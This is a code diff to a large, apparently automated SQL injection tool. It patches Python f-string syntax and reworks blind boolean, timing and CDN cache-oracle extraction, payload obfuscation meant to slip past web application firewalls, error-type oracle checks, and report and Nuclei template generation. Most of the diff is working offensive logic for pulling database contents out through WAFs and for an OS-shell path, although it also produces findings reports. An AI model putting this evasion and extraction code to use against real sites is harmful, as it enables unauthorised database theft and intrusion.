@@ -50925,7 +50925,7 @@ class REPL:
         else: print(f"  OS shell not implemented for {self.dbms}"); return
         fp=await _send_injected(self.engine,self.method,self.url,self.data,self.data_fmt,
                                  self.result.param,self.original+p,self.tamper_chain)
-        print(f"  Status: {fp.status_code}\n  Body: {_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")[:500]}")
+        print(f"  Status: {fp.status_code}\n  Body: {_safe_decode_body(fp, encoding='utf-8', errors='replace', func_name='extraction')[:500]}")
 
     @staticmethod
     def _print_list(title,items):
@@ -52674,10 +52674,11 @@ class Scanner:
                 # BUG-DB2-FIREBIRD-ERROR-COLS FIX: Firebird uses RDB$RELATION_FIELDS, not
                 # information_schema. Without this branch, column enumeration returned [].
                 # Firebird uses FIRST N SKIP M for offset-based pagination.
-                count_query = f"SELECT COUNT(*) FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='{(table or "").upper()}'"
+                _fb_tbl = (table or "").upper()
+                count_query = f"SELECT COUNT(*) FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='{_fb_tbl}'"
                 col_query_tpl = (f"SELECT FIRST 1 SKIP {{offset}} TRIM(RDB$FIELD_NAME) "
                                  f"FROM RDB$RELATION_FIELDS "
-                                 f"WHERE RDB$RELATION_NAME='{(table or "").upper()}' "
+                                 f"WHERE RDB$RELATION_NAME='{_fb_tbl}' "
                                  f"ORDER BY RDB$FIELD_POSITION")
             elif _dbms == "SAP_HANA":
                 # BUG-DB2-FIREBIRD-ERROR-COLS FIX: SAP HANA uses SYS.TABLE_COLUMNS, not
@@ -53428,7 +53429,17 @@ class Scanner:
             r'|all_objects.*ROWNUM|DBA_OBJECTS.*ROWNUM|RANDOMBLOB|ZEROBLOB|BENCHMARK',
             _payload_raw, _re.I))
 
-        if not _has_timing and _is_stacked:
+        # BUG-STACKED-BOOLEAN-TIMING-SYNTHESIS FIX (CRITICAL): When detection used a boolean
+        # technique (ST/WB/EX/HY/B/BH/IN/NV), but the detection payload happened to contain
+        # a semicolon (e.g. stacked-but-boolean payloads like "'; AND 1=2; --"), this block
+        # synthesised a fresh SLEEP-based timing template from scratch, permanently discarding
+        # the boolean oracle. Calibration then measured timing margin=-5ms (CDN noise) and
+        # returned False without ever trying the boolean oracle path. Fix: skip timing
+        # synthesis for boolean-based techniques so they fall through to the boolean template
+        # path at the else branch below (lines 53627+).
+        _det_tech_inf = getattr(enum.result, 'technique', '') or ''
+        _BOOL_TECHS_INF = frozenset({'B', 'BH', 'IN', 'ST', 'NV', 'WB', 'EX', 'HY'})
+        if not _has_timing and _is_stacked and _det_tech_inf not in _BOOL_TECHS_INF:
             _time_sec = getattr(enum.config, "time_sec", 5) or 5
             # BUG FIX: rsplit("SELECT", 1)[0] on a stacked payload that contains NO
             # SELECT (e.g. DML-only payloads like "; BEGIN TRANSACTION; UPDATE...; ROLLBACK",
@@ -54862,14 +54873,33 @@ class Scanner:
                     LOG.info("[Inference] Timing dead but boolean oracle alive  deferring BITWISE extraction")
                     _try_bitwise_deferred = True
                 else:
-                    # BUG-FLOOR-RETRY-UNREACHABLE-FIX: was `return False` here, which
-                    # skipped the _min_viable_margin check below that contains the floor
-                    # retry.  For genuine injections where the 0.1s sleep gives a
-                    # slightly-negative margin (CDN bias ≈ -50ms), trying the 0.3s floor
-                    # can flip the margin positive (+300ms sleep - 50ms bias = +250ms ≥
-                    # 240ms min).  Fall through — the retry block handles both cases:
-                    # if 0.3s also fails it returns False; if it passes, extraction proceeds.
-                    LOG.info("[Inference] All template approaches failed — trying sleep floor before final abort")
+                    # BUG-INFERENCE-PREWIRED-ORACLE FIX (CRITICAL): When timing calibration
+                    # fails AND no boolean oracle was detected from calibration probes, check
+                    # if V25-Extract wired a pre-detection-phase boolean oracle onto
+                    # enum._mse_instance._boolean_oracle (e.g. _inline_bool_oracle_wb for
+                    # ST/WB/EX/HY techniques). This oracle uses the exact same tamper chain
+                    # and bypass context as detection — it CAN distinguish TRUE from FALSE
+                    # even when CDN timing noise masks the timing signal.
+                    _pre_wired_bool_oracle_inf = getattr(
+                        getattr(enum, '_mse_instance', None), '_boolean_oracle', None)
+                    if _pre_wired_bool_oracle_inf is not None:
+                        LOG.info("[Inference] All calibration failed — found pre-wired "
+                                 "detection oracle on enum._mse_instance._boolean_oracle, "
+                                 "activating for BITWISE extraction")
+                        print("[+] [Inference] Pre-wired detection oracle found — "
+                              "wiring into extraction engine (bypasses timing calibration)",
+                              flush=True)
+                        _boolean_oracle = True
+                        _try_bitwise_deferred = True
+                    else:
+                        # BUG-FLOOR-RETRY-UNREACHABLE-FIX: was `return False` here, which
+                        # skipped the _min_viable_margin check below that contains the floor
+                        # retry.  For genuine injections where the 0.1s sleep gives a
+                        # slightly-negative margin (CDN bias ≈ -50ms), trying the 0.3s floor
+                        # can flip the margin positive (+300ms sleep - 50ms bias = +250ms ≥
+                        # 240ms min).  Fall through — the retry block handles both cases:
+                        # if 0.3s also fails it returns False; if it passes, extraction proceeds.
+                        LOG.info("[Inference] All template approaches failed — trying sleep floor before final abort")
 
         _thresh = (ms_true + ms_false) / 2
         LOG.info("[Inference]  Threshold=%.0fms (margin=%.0fms)", _thresh, _margin)
@@ -57195,6 +57225,22 @@ class Scanner:
                 if (_bool_true_len is not None and _bool_false_len is not None
                         and _bool_true_len != _bool_false_len):
                     return abs(_bl - _bool_true_len) < abs(_bl - _bool_false_len)
+                # BUG-PREWIRED-ORACLE-WAFEVAL FIX (HIGH): When all calibration signals are
+                # None (no hash, header, SimHash, or status oracle from calibration) but
+                # _boolean_oracle=True because it was set from the pre-wired detection oracle
+                # (Fix 2 above), _waf_aware_eval falls through to `return ms >= _thresh`.
+                # With margin=-5ms, _thresh ≈ 0 so ms (always >0) is always True — every
+                # bit reads as 1 → garbage output. Fix: call the pre-wired oracle directly
+                # as last resort before falling to timing. This gives the detection-phase
+                # oracle (e.g. _inline_bool_oracle_wb) a chance to evaluate the condition
+                # using the correct WAF bypass context.
+                _pre_wired_eval_fn = getattr(
+                    getattr(enum, '_mse_instance', None), '_boolean_oracle', None)
+                if _pre_wired_eval_fn is not None:
+                    try:
+                        return await _pre_wired_eval_fn(cond)
+                    except Exception:
+                        pass
             return ms >= _thresh
 
         #  ENHANCEMENT: Auto-adjust timing 
@@ -71783,7 +71829,8 @@ class WAFBypassEngine:
         variants.append(v)
 
         # 6. Redundant subquery wrapping
-        variants.append(f"(SELECT * FROM (SELECT 1)x WHERE {p.lstrip('\' ')}) -- -")
+        _p_stripped = p.lstrip("' ")
+        variants.append(f"(SELECT * FROM (SELECT 1)x WHERE {_p_stripped}) -- -")
 
         # 7. Full chaos: all whitespace variants + operator substitution + padding
         v = p.replace(' ', '\t').replace('AND', '/*!AND*/').replace('OR', '/*!OR*/')
@@ -113530,7 +113577,7 @@ class TechniqueCascadeEngine:
                         print(f"[*]    BH false-condition probe (param={param!r})", flush=True)
                         print(f"[*]     sim_true={_bh_sim:.3f} sim_false={_bh_sim_f:.3f} "
                               f"gap={_bh_gap:.3f} need={_confirm_gap:.3f} "
-                              f"{' CONFIRMED (1/6)' if _bh_gap > getattr(self, "_dynamic_gap", 0.45) else ' gap too small'}")
+                              f"{' CONFIRMED (1/6)' if _bh_gap > getattr(self, '_dynamic_gap', 0.45) else ' gap too small'}")
 
                         if _bh_gap > getattr(self, "_dynamic_gap", 0.45):
                             # Multi-probe: need 3 out of 4
@@ -113565,7 +113612,7 @@ class TechniqueCascadeEngine:
                                 if _mp_gap > getattr(self, "_dynamic_gap", 0.45):
                                     _bh_confirmed += 1
                                 print(f"[*]     BH multi-probe {_bh_mp+2}/6: "
-                                      f"gap={_mp_gap:.3f} {' CONFIRMED' if _mp_gap > getattr(self, "_dynamic_gap", 0.45) else ' gap too small'} "
+                                      f"gap={_mp_gap:.3f} {' CONFIRMED' if _mp_gap > getattr(self, '_dynamic_gap', 0.45) else ' gap too small'} "
                                       f"({_bh_confirmed}/3 needed)")
                                 if _bh_confirmed >= 3: break
 
@@ -118284,17 +118331,35 @@ class UniversalScanOrchestrator:
                                             if not _wired_fallback and _det_tech in ('WB', 'EX', 'HY', 'ST'):
                                                 _baseline_body_wb = baseline.get('samples', [{}])[0] if baseline.get('samples') else None
                                                 _baseline_raw_wb  = (_baseline_body_wb.body if _baseline_body_wb and hasattr(_baseline_body_wb, 'body') else b'')
-                                                # BUG-WB-ORACLE-BASELINE FIX: stub → sim≈0.5, oracle broken
+                                                # BUG-WB-ORACLE-BASELINE FIX: stub → sim≈0.5, oracle broken.
+                                                # BUG-WB-ORACLE-BASELINE-RETRY FIX (HIGH): Original code made
+                                                # only ONE attempt to fetch the baseline. A single network
+                                                # error or WAF block leaves _baseline_raw_wb=b"" permanently,
+                                                # making sim(b"", any_response)≈0 < 0.75 → oracle always
+                                                # returns False → extraction returns all spaces or "".
+                                                # Fix: retry up to 3 times with exponential backoff (1s, 2s,
+                                                # 4s). If all retries fail, log and skip installing the oracle
+                                                # rather than installing a permanently-broken one.
                                                 if not _baseline_raw_wb:
-                                                    try:
-                                                        _wb_ref = await _send_injected(
-                                                            _scanner_ref.engine, method, url, data, data_fmt,
-                                                            _det_param, _det_orig, _det_tamper)
-                                                        if _validate_response(_wb_ref, "response_body_check"):
-                                                            _baseline_raw_wb = _wb_ref.body
-                                                    except Exception:
-                                                        pass
-                                                _norm_base_wb = ResponseNormaliser.normalise(_baseline_raw_wb)
+                                                    for _wb_retry in range(3):
+                                                        try:
+                                                            if _wb_retry > 0:
+                                                                await asyncio.sleep(2 ** _wb_retry)
+                                                            _wb_ref = await _send_injected(
+                                                                _scanner_ref.engine, method, url, data, data_fmt,
+                                                                _det_param, _det_orig, _det_tamper)
+                                                            if _validate_response(_wb_ref, "response_body_check"):
+                                                                _baseline_raw_wb = _wb_ref.body
+                                                                if _baseline_raw_wb:
+                                                                    break
+                                                        except Exception:
+                                                            pass
+                                                    if not _baseline_raw_wb:
+                                                        print("[!] [V25-Extract] WB baseline probe failed after 3 retries "
+                                                              f"(tech={_det_tech!r}) — skipping WB oracle to avoid "
+                                                              "permanently-False oracle", flush=True)
+                                                        _wired_fallback = False  # don't install a broken oracle
+                                                _norm_base_wb = ResponseNormaliser.normalise(_baseline_raw_wb) if _baseline_raw_wb else b""
 
                                                 # BUG-INLINE-BOOL-ORACLE-WB-MISSING-LIGHT-VARY FIX (CRITICAL,
                                                 # all 5 DBMSes, WB/EX/HY/ST techniques, all surfaces):
@@ -118385,16 +118450,21 @@ class UniversalScanOrchestrator:
                                                     except Exception:
                                                         return False
 
-                                                if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
-                                                    class _FakeMSE_WB:
-                                                        _boolean_oracle = None
-                                                        _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
-                                                    _enum._mse_instance = _FakeMSE_WB()
-                                                _enum._mse_instance._boolean_oracle = _inline_bool_oracle_wb
-                                                _wired_fallback = True
-                                                print(f"[+] [V25-Extract] Inline boolean oracle wired for {_det_tech!r} "
-                                                      "(WAFBypass/Exotic/Hybrid/Standard detection) — extraction can proceed",
-                                                      flush=True)
+                                                # BUG-WB-ORACLE-BASELINE-RETRY FIX: Only wire the oracle
+                                                # when we have a valid (non-empty) baseline. If all 3
+                                                # retries failed, _wired_fallback was reset to False above
+                                                # and we must NOT wire the broken oracle.
+                                                if _baseline_raw_wb:
+                                                    if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
+                                                        class _FakeMSE_WB:
+                                                            _boolean_oracle = None
+                                                            _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
+                                                        _enum._mse_instance = _FakeMSE_WB()
+                                                    _enum._mse_instance._boolean_oracle = _inline_bool_oracle_wb
+                                                    _wired_fallback = True
+                                                    print(f"[+] [V25-Extract] Inline boolean oracle wired for {_det_tech!r} "
+                                                          "(WAFBypass/Exotic/Hybrid/Standard detection) — extraction can proceed",
+                                                          flush=True)
 
                                             if not _wired_fallback:
                                                 print("[!] [V25-Extract] ConditionalErrorOracle failed "
@@ -122267,7 +122337,8 @@ class ScannerV14(ScannerV13):
         print("\n[*] ══════════════════════════════════════════════════════", flush=True)
         print(f"[*]  SCAN PLAN: {len(_dbms_order_scan)} DBMS × {len(SCAN_CATEGORY_ORDER)} categories × {len(_all_param_names)} params × 3 methods", flush=True)
         print(f"[*]  DBMSes   : {_dbms_order_scan}", flush=True)
-        print(f"[*]  Params   : {_all_param_names[:8]}{"..." if len(_all_param_names) > 8 else ""}", flush=True)
+        _param_ellipsis = "..." if len(_all_param_names) > 8 else ""
+        print(f"[*]  Params   : {_all_param_names[:8]}{_param_ellipsis}", flush=True)
         print(f"[*]  Categories: {[c for c,_ in SCAN_CATEGORY_ORDER]}", flush=True)
         print(f"[*]  Payloads  : 300 per DBMS×category at level {cfg.level} = {300 * len(SCAN_CATEGORY_ORDER) * len(_dbms_order_scan)} total", flush=True)
         print("[*] ══════════════════════════════════════════════════════\n", flush=True)
@@ -129175,7 +129246,9 @@ class MultiStrategyExtractor:
                 print(f"[MSE]  {name} validation error: {e}", flush=True)
 
         self._oracles = _validated
-        print(f"[MSE] {len(self._oracles)}/8 oracles available: {self._oracles}", flush=True)
+        # BUG-MSE-DENOM-HARDCODED FIX (LOW): denominator was hardcoded as 8 but
+        # _probes list only has 3-5 entries. "0/8" is misleading. Use actual probe count.
+        print(f"[MSE] {len(self._oracles)}/{len(_probes)} oracles available: {self._oracles}", flush=True)
         self._calibrated = True
 
         # Enhancement 5: WAF-adaptive tamper discovery
@@ -146360,32 +146433,52 @@ class NovelWAFBypassExtractor:
                             # and function-name obfuscation to every send before it goes to send_fn.
                             # _co_req is a unique counter initialized before the for _pos loop;
                             # incremented on every binary-search step for per-probe seed diversity.
+                            #
+                            # BUG-CACHE-ORACLE-FULL-PAYLOAD-OBFUS FIX (HIGH): Previous code applied
+                            # obfuscation to the ENTIRE payload including the THEN/ELSE branches.
+                            # apply_heavy_variation and _obfuscate_extraction_cond transform function
+                            # names (e.g. md5→MD5, random→RANDOM), add noise tokens, and alter
+                            # literal formatting — changing the THEN/ELSE branches makes the CDN
+                            # response body non-deterministic even for FALSE conditions (different
+                            # obfuscation seed each probe → different transformed `version()` call
+                            # → different response text → CDN sees a "new" response every time →
+                            # can't distinguish cache-hit from cache-miss → oracle broken).
+                            #
+                            # Fix: apply obfuscation ONLY to the CONDITION PART (the `_char_func`
+                            # expression: ASCII/SUBSTR/UNICODE/ORD). Keep THEN/ELSE branches
+                            # UNCHANGED so: FALSE → `version()` always produces the same DB version
+                            # string → CDN caches it → second send is a hit (fast); TRUE →
+                            # `md5(random()::text)` produces a random string → CDN either does not
+                            # cache or sees a different response → second send is a miss (slow).
+                            # This preserves the cache-oracle mechanism while bypassing WAF keyword
+                            # detection on the condition part.
                             _co_req += 1
                             _obf_seed = _co_req + id(send_fn) % 9999  # add send_fn identity for diversity
                             try:
-                                _test_payload_obf = apply_heavy_variation(
-                                    _test_payload, _obf_seed, data_fmt="url")
-                                _test_payload_obf = _obfuscate_extraction_cond(
-                                    _test_payload_obf, _obf_seed)
-                                # BUG-V183-NOVEL-CACHE-ORACLE-MISSING-SQL-NOISE FIX (MEDIUM;
-                                # NovelWAFBypassExtractor cache inference oracle binary search;
-                                # all 5 DBMSes; all surfaces; all HTTP methods):
-                                # _test_payload_obf received apply_heavy_variation +
-                                # _obfuscate_extraction_cond but NOT apply_sql_noise().
-                                # Cache oracle payloads contain `>={mid}` comparison operands
-                                # (e.g. CASE WHEN (ASCII(SUBSTR(version(),{pos},1))>={mid})
-                                # THEN MD5(RANDOM()::TEXT) ELSE version() END). ML WAFs
-                                # fingerprint the `>=N` token n-gram pattern across 3-5 probes
-                                # and block → cache timings become uniform → oracle cannot
-                                # distinguish TRUE from FALSE → extraction returns wrong chars.
-                                # apply_sql_noise is DETERMINISTIC per _obf_seed, so both the
-                                # first and second sends (which use the IDENTICAL _test_payload_obf)
-                                # receive the same modified form — the CDN cache key still matches,
-                                # preserving the cache-hit/miss timing signal that the oracle needs.
-                                # Numeric safety: apply_sql_noise only wraps integer literals
-                                # after >=, BETWEEN, THEN, ELSE; MD5(RANDOM()::TEXT) function
-                                # args and SUBSTR position arguments are never rewritten.
-                                _test_payload_obf = apply_sql_noise(_test_payload_obf, _obf_seed)
+                                # Obfuscate only the condition expression (e.g. ASCII(SUBSTR(version(),1,1))>=32)
+                                # Keep THEN/ELSE branches as-is to preserve deterministic caching behavior
+                                _raw_cond = f"{_char_func}>={_mid}"
+                                _obf_cond = apply_heavy_variation(_raw_cond, _obf_seed, data_fmt="url")
+                                _obf_cond = _obfuscate_extraction_cond(_obf_cond, _obf_seed)
+                                _obf_cond = apply_sql_noise(_obf_cond, _obf_seed)
+                                # Rebuild the full payload with the obfuscated condition
+                                # THEN/ELSE branches are taken directly from _test_payload (unmodified)
+                                import re as _cache_re
+                                _cond_m = _cache_re.search(
+                                    r'CASE WHEN \((.+)\) THEN (.+) ELSE (.+) END',
+                                    _test_payload, _cache_re.IGNORECASE | _cache_re.DOTALL)
+                                if _cond_m:
+                                    _then_branch = _cond_m.group(2)
+                                    _else_branch = _cond_m.group(3)
+                                    _test_payload_obf = (f"CASE WHEN ({_obf_cond}) "
+                                                         f"THEN {_then_branch} ELSE {_else_branch} END")
+                                else:
+                                    # Fallback: can't parse structure, obfuscate whole payload
+                                    _test_payload_obf = apply_heavy_variation(
+                                        _test_payload, _obf_seed, data_fmt="url")
+                                    _test_payload_obf = _obfuscate_extraction_cond(
+                                        _test_payload_obf, _obf_seed)
+                                    _test_payload_obf = apply_sql_noise(_test_payload_obf, _obf_seed)
                             except Exception:
                                 _test_payload_obf = _test_payload  # non-fatal: use plain if obfus fails
 
@@ -146778,6 +146871,28 @@ class ConditionalErrorTypeOracle:
             await asyncio.sleep(delay)
 
             if err_status != clean_status:
+                # BUG-ERRTYPE-STATUS-WAF-COLLISION FIX (HIGH): The status-based calibration
+                # path returned immediately WITHOUT the WAF false-positive guard that the
+                # length-based path has below. When a WAF passes simple arithmetic (1/0 →
+                # HTTP 500) but returns HTTP 200 challenge pages for complex SQL function
+                # keywords (ASCII, SUBSTRING, BITAND used in extraction), the calibration
+                # succeeds: simple error_probe → HTTP 500 ≠ clean 200. But during
+                # _bitwise_extract_with_oracle(), every probe contains complex SQL → WAF
+                # returns HTTP 200 challenge page. Since true_sig=200, sig==true_sig → True
+                # for ALL probes → all bits set → garbage Unicode (e.g. U+FE9C7 as observed).
+                # Fix: apply the same WAF keyword check as the length path — send a probe
+                # with complex SQL in a known-FALSE condition. If WAF returns clean_status
+                # (200) for it (matching true_sig), the oracle is unreliable → skip.
+                # Use SUBSTRING (extraction keyword) not VERSION()=0 (detection keyword).
+                _waf_chk_s = f"CASE WHEN (ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                try:
+                    _fp_waf_s, _ = await send_fn(_waf_chk_s)
+                    _waf_s_status = getattr(_fp_waf_s, 'status_code', 0) if _fp_waf_s else 0
+                    if _waf_s_status == clean_status:
+                        # WAF challenge page matched true_sig status → oracle unreliable
+                        continue
+                except Exception:
+                    pass  # WAF check failed → conservatively allow the oracle
                 return etype, clean_status, err_status, "status"
             if abs(err_len - clean_len) > 20:
                 _eo_max = max(err_len, clean_len, 1)
@@ -146789,14 +146904,24 @@ class ConditionalErrorTypeOracle:
                     # When WAF blocks extraction probes, the block-page content_length
                     # can equal clean_len (true_sig).  Every probe then returns True →
                     # all bits set → garbage Unicode output (e.g. U+FE9C7).
-                    # Fix: send a probe with real SQL function keywords (ASCII, VERSION)
-                    # in a known-FALSE condition.  It should return err_len (error page).
-                    # If it returns clean_len instead, the WAF is blocking function-keyword
-                    # payloads with a response the same size as our true_sig → oracle
-                    # unreliable for this error type → skip to next.
-                    _waf_check = f"CASE WHEN (ASCII(VERSION())=0) THEN 1 ELSE ({eexpr}) END"
-                    _fp_waf, _ = await send_fn(_waf_check)
-                    _waf_len = getattr(_fp_waf, "content_length", 0)
+                    # Fix: send a probe with real SQL function keywords in a known-FALSE
+                    # condition that matches the EXACT SQL form used in extraction
+                    # (_bitwise_extract_with_oracle uses ASCII(SUBSTRING(...))&mask=mask).
+                    # If the WAF blocks this form, it will also block extraction probes →
+                    # oracle unreliable for this error type → skip to next.
+                    # BUG-ERRTYPE-WAF-CHECK-FORM FIX (HIGH): Previous check used
+                    # ASCII(VERSION())=0 — a different form than extraction uses. A WAF that
+                    # specifically fingerprints SUBSTRING/BITAND patterns would pass
+                    # ASCII(VERSION())=0 but block ASCII(SUBSTRING(...))&mask=mask, causing
+                    # a false negative here. Updated to use the actual extraction form:
+                    # ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))&1=0 — always FALSE (=0),
+                    # contains SUBSTRING and bitwise-AND (&) exactly as extraction uses.
+                    _waf_check = f"CASE WHEN (ASCII(SUBSTRING(CAST(1 AS VARCHAR),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    try:
+                        _fp_waf, _ = await send_fn(_waf_check)
+                    except Exception:
+                        _fp_waf = None
+                    _waf_len = getattr(_fp_waf, "content_length", 0) if _fp_waf else 0
                     if abs(_waf_len - clean_len) < 20:
                         # WAF blocked the complex probe and returned true_sig-sized response
                         continue
@@ -147218,6 +147343,7 @@ class ComprehensivePoCGenerator:
         from urllib.parse import urlparse
         host = urlparse(url).netloc
         safe_id = re.sub(r'[^a-z0-9-]', '-', f"sqli-{dbms}-{technique}".lower())
+        _nuclei_payload = payload.replace('"', '\\"')
         return f"""\
 id: {safe_id}
 info:
@@ -147231,7 +147357,7 @@ requests:
       - "{url}"
     payloads:
       payload:
-        - "{payload.replace('"', '\\"')}"
+        - "{_nuclei_payload}"
     fuzzing:
       - part: query
         key: {param}
@@ -149029,6 +149155,47 @@ Never concatenate user input directly into SQL strings.</pre>"""
             {"vulnerabilities": vulns, "extracted_data": data},
             indent=2, default=str)
 
+        # Pre-compute nested f-strings (Python <3.12 can't nest same-delimiter f-strings)
+        if vulns:
+            _findings_table_html = (
+                "\n      <div class=\"table-responsive\">\n"
+                "        <table class=\"table table-hover table-dark table-sm align-middle\" id=\"findingsTable\">\n"
+                "          <thead><tr>\n"
+                "            <th>Parameter</th><th>Technique</th><th>CVSS</th>\n"
+                "            <th>DBMS</th><th>Confidence</th><th>Payload</th>\n"
+                "            <th>CVSS Vector</th><th>Timestamp</th>\n"
+                "          </tr></thead>\n"
+                f"          <tbody>{rows_html}</tbody>\n"
+                "        </table>\n"
+                "      </div>"
+            )
+            _chart_js = (
+                f"const tCtx = document.getElementById('techChart').getContext('2d');\n"
+                f"  new Chart(tCtx, {{\n"
+                f"    type: 'doughnut',\n"
+                f"    data: {{ labels: {chart_labels}, datasets: [{{\n"
+                f"      data: {chart_data}, backgroundColor: {chart_colors}, borderWidth: 2,\n"
+                f"      borderColor: '#0f172a'\n"
+                f"    }}] }},\n"
+                f"    options: {{ responsive:true, plugins: {{ legend: {{\n"
+                f"      position:'right', labels: {{ color:'#94a3b8', font:{{size:12}} }}\n"
+                f"    }} }} }}\n"
+                f"  }});\n"
+                f"  const sCtx = document.getElementById('sevChart').getContext('2d');\n"
+                f"  new Chart(sCtx, {{\n"
+                f"    type: 'bar',\n"
+                f"    data: {{ labels: {sev_labels}, datasets: [{{\n"
+                f"      data: {sev_data}, backgroundColor: {sev_colors_js}, borderRadius:6\n"
+                f"    }}] }},\n"
+                f"    options: {{ responsive:true, plugins: {{ legend: {{ display:false }} }},\n"
+                f"      scales: {{ y: {{ ticks: {{ color:'#64748b' }}, grid:{{ color:'#1e293b' }} }},\n"
+                f"                 x: {{ ticks: {{ color:'#94a3b8' }}, grid:{{ display:false }} }} }} }}\n"
+                f"  }});"
+            )
+        else:
+            _findings_table_html = '<p class="text-muted">No vulnerabilities found.</p>'
+            _chart_js = ''
+
         return f"""<!DOCTYPE html>
 <html lang="en" data-bs-theme="dark">
 <head>
@@ -149122,17 +149289,7 @@ Never concatenate user input directly into SQL strings.</pre>"""
     <!-- FINDINGS TABLE ----------------------------------------------------->
     <div class="mb-5">
       <h5 class="text-secondary fw-bold mb-3"> Findings ({n_vulns})</h5>
-      {'<p class="text-muted">No vulnerabilities found.</p>' if not vulns else f"""
-      <div class="table-responsive">
-        <table class="table table-hover table-dark table-sm align-middle" id="findingsTable">
-          <thead><tr>
-            <th>Parameter</th><th>Technique</th><th>CVSS</th>
-            <th>DBMS</th><th>Confidence</th><th>Payload</th>
-            <th>CVSS Vector</th><th>Timestamp</th>
-          </tr></thead>
-          <tbody>{rows_html}</tbody>
-        </table>
-      </div>"""}
+      {_findings_table_html}
     </div>
 
     <!-- SCHEMA ------------------------------------------------------------->
@@ -149169,27 +149326,7 @@ Never concatenate user input directly into SQL strings.</pre>"""
 
   <script>
   {'// Technique chart' if vulns else ''}
-  {f"""const tCtx = document.getElementById('techChart').getContext('2d');
-  new Chart(tCtx, {{
-    type: 'doughnut',
-    data: {{ labels: {chart_labels}, datasets: [{{
-      data: {chart_data}, backgroundColor: {chart_colors}, borderWidth: 2,
-      borderColor: '#0f172a'
-    }}] }},
-    options: {{ responsive:true, plugins: {{ legend: {{
-      position:'right', labels: {{ color:'#94a3b8', font:{{size:12}} }}
-    }} }} }}
-  }});
-  const sCtx = document.getElementById('sevChart').getContext('2d');
-  new Chart(sCtx, {{
-    type: 'bar',
-    data: {{ labels: {sev_labels}, datasets: [{{
-      data: {sev_data}, backgroundColor: {sev_colors_js}, borderRadius:6
-    }}] }},
-    options: {{ responsive:true, plugins: {{ legend: {{ display:false }} }},
-      scales: {{ y: {{ ticks: {{ color:'#64748b' }}, grid:{{ color:'#1e293b' }} }},
-                 x: {{ ticks: {{ color:'#94a3b8' }}, grid:{{ display:false }} }} }} }}
-  }});""" if vulns else ''}
+  {_chart_js}
   </script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
           crossorigin="anonymous"></script>
@@ -149331,6 +149468,7 @@ class NucleiTemplateGenerator:
                   else "application/x-www-form-urlencoded")
             content_type = f"\n      Content-Type: '{ct}'"
 
+        _nuclei_payload_escaped = payload.replace('"', '\\"')
         return f"""\
 id: {tid}
 
@@ -149350,7 +149488,7 @@ info:
     - https://owasp.org/www-community/attacks/SQL_Injection
 
 variables:
-  sqli_payload: "{payload.replace('"', '\\"')}"
+  sqli_payload: "{_nuclei_payload_escaped}"
 
 http:
   - method: {method.upper()}
